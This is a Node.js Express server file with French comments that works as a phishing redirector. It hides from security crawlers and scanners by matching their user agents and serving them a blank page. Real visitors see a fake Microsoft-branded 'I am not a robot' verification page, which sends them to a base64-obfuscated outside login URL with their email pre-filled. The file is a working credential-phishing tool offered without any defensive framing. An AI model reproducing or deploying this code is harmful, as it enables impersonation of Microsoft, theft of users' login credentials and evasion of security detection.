const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// Tes liens finaux encodés
const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.all('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    
    // Récupération de l'email via m= (depuis l'attachement) ou login_hint
    const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
    
    // Détection robots
    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);

    if (isBotUA || (targetEmail === "" && !req.query.debug)) {
        return res.send('<html><body style="background:white;"></body></html>');
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Verification</title>
            <style>
                body { background: #f4f7f9; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .container { background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: left; max-width: 400px; width: 90%; overflow: hidden; border: 1px solid #e1e4e8; }
                .header { background: #0078d4; color: white; padding: 12px 20px; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
                .content { padding: 25px; }
                h2 { color: #24292e; font-size: 18px; margin: 0 0 10px 0; font-weight: 600; }
                p { font-size: 14px; color: #586069; margin-bottom: 20px; line-height: 1.5; }
                .checkpoint-box { background: #fff; border: 1px solid #0078d4; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; transition: background 0.2s; }
                .checkpoint-box:hover { background: #f0f7ff; }
                #customCheckbox { width: 20px; height: 20px; border: 2px solid #0078d4; border-radius: 3px; background: white; margin-right: 12px; flex-shrink: 0; }
                #loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-right: 12px; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .main-text { font-weight: 600; font-size: 14px; color: #24292e; }
                .footer { padding: 15px 25px; background: #fafbfc; border-top: 1px solid #e1e4e8; font-size: 11px; color: #6a737d; display: flex; justify-content: space-between; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">Microsoft Security Compliance</div>
                <div class="content">
                    <h2>Final Verification</h2>
                    <p>To access the corporate resource, please confirm you are a verified user of <strong>${targetEmail.split('@')[1] || 'the domain'}</strong>.</p>
                    <div class="checkpoint-box" id="clickArea">
                        <div id="customCheckbox"></div>
                        <div id="loader"></div>
                        <div class="main-text" id="mainMsg">I am not a robot</div>
                    </div>
                </div>
                <div class="footer">
                    <span>ID: ${Math.floor(Math.random() * 999999)}</span>
                    <span>&copy; 2026 Security Systems</span>
                </div>
            </div>
            <script>
                document.getElementById('clickArea').addEventListener('click', function() {
                    const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
                    document.getElementById('customCheckbox').style.display = 'none';
                    document.getElementById('loader').style.display = 'block';
                    document.getElementById('mainMsg').innerText = "Verifying...";
                    
                    setTimeout(() => {
                        let target = atob(p1) + atob(p2);
                        if(em !== "") target += (target.includes('?') ? '&' : '?') + "login_hint=" + encodeURIComponent(em);
                        window.location.href = target;
                    }, 1500); 
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
